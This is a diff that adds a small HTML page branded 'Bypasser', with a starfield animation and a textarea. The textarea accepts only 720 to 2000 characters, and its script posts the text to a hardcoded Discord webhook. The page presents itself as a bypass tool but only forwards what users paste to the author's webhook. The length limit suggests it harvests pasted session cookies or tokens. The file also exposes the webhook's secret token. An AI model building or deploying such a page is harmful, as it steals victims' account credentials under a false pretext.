@@ -1,1 +1,150 @@
 bypasser.space.io
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Bypasser</title>
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      background: black;
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      font-family: Arial, sans-serif;
+      color: white;
+    }
+    canvas#starfall {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: -1;
+    }
+    textarea {
+      width: 80%;
+      height: 200px;
+      padding: 10px;
+      font-size: 16px;
+      border-radius: 10px;
+      border: none;
+      resize: none;
+    }
+    button {
+      margin-top: 15px;
+      padding: 10px 20px;
+      font-size: 18px;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      background: #444;
+      color: white;
+      transition: 0.3s;
+    }
+    button:hover {
+      background: #666;
+    }
+    .galaxy-text {
+      font-size: 20px;
+      font-weight: bold;
+      background: linear-gradient(90deg, #ff00ff, #00ffff, #ffcc00, #ff00ff);
+      background-size: 400% 400%;
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      animation: galaxy 8s ease infinite;
+    }
+    @keyframes galaxy {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+  </style>
+</head>
+<body>
+  <canvas id="starfall"></canvas>
+  <h1>Bypasser</h1>
+  <div id="changingText" class="galaxy-text"></div>
+  <textarea id="message" placeholder="Type between 720 and 2000 characters..."></textarea>
+  <button onclick="sendMessage()">OK</button>
+
+  <script>
+    // Starfall background
+    const canvas = document.getElementById('starfall');
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+
+    let stars = [];
+    for (let i = 0; i < 200; i++) {
+      stars.push({
+        x: Math.random() * canvas.width,
+        y: Math.random() * canvas.height,
+        size: Math.random() * 2,
+        speed: Math.random() * 3 + 1
+      });
+    }
+
+    function animateStars() {
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+      ctx.fillStyle = 'white';
+      stars.forEach(star => {
+        ctx.beginPath();
+        ctx.arc(star.x, star.y, star.size, 0, Math.PI * 2);
+        ctx.fill();
+        star.y += star.speed;
+        if (star.y > canvas.height) {
+          star.y = 0;
+          star.x = Math.random() * canvas.width;
+        }
+      });
+      requestAnimationFrame(animateStars);
+    }
+    animateStars();
+
+    // Rotating text
+    const texts = [
+      "are u femboy by any chance",
+      "made by lunarQuestX",
+      "bypasser active...",
+      "galaxy vibes ✨"
+    ];
+    let currentIndex = 0;
+    const changingText = document.getElementById('changingText');
+    function updateText() {
+      changingText.textContent = texts[currentIndex];
+      currentIndex = (currentIndex + 1) % texts.length;
+    }
+    updateText();
+    setInterval(updateText, 4000);
+
+    // Webhook sender
+    function sendMessage() {
+      const message = document.getElementById('message').value;
+      if (message.length < 720 || message.length > 2000) {
+        alert("Message must be between 720 and 2000 characters!");
+        return;
+      }
+
+      const webhookUrl = "https://discord.com/api/webhooks/1414274780432957471/MimpCGPCfS73_I1T5n5d89M4FM1HwRKDZ8ZGomkGWpUlHW4ISrtEeQQ64NxVGyEkPMR9"; // <--- vervang met je webhook
+      fetch(webhookUrl, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ content: message })
+      }).then(res => {
+        if (res.ok) {
+          alert("Message sent!");
+        } else {
+          alert("Failed to send message.");
+        }
+      }).catch(err => alert("Error: " + err));
+    }
+  </script>
+</body>
+</html>
